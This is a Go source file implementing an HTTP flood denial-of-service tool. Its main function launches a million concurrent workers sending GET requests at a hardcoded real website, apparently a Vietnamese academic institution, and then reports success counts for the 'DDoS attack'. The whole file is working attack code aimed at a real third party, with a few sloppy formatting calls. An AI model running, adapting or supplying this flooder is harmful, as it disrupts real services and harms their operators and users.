package main

import (
	"fmt"
	ddos "github.com/Konstantin8105/DDoS"
	freeport "github.com/Konstantin8105/FreePort"
	"io"
	"log"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"
)

const link = "https://www.dav.edu.vn/"

func main() {
	port, err := freeport.Get()
	if err != nil {
		log.Fatal("Cannot found free tcp port. Error = %v", err)
	}
	createServer(port)

	d, err := ddos.New(link, 1000000)
	if err != nil {
		log.Fatal("Cannot create a new ddos structure")
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	success, amount := d.Result()
	if success == 0 || amount == 0 {
		log.Fatal("Negative result of DDoS attack.\n"+
			"Success requests = %v.\n"+
			"Amount requests = %v", success, amount)
	}
	fmt.Println("Statistic: %d %d", success, amount)
}

// Create a simple go server
func createServer(port int) {
	go func() {
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			fmt.Fprintf(w, "Hi there, I love %s!", r.URL.Path[1:])
		})
		if err := http.ListenAndServe(":"+strconv.Itoa(port), nil); err != nil {
			log.Fatalf("Server is down. %v", err)
		}
	}()
}

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(io.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
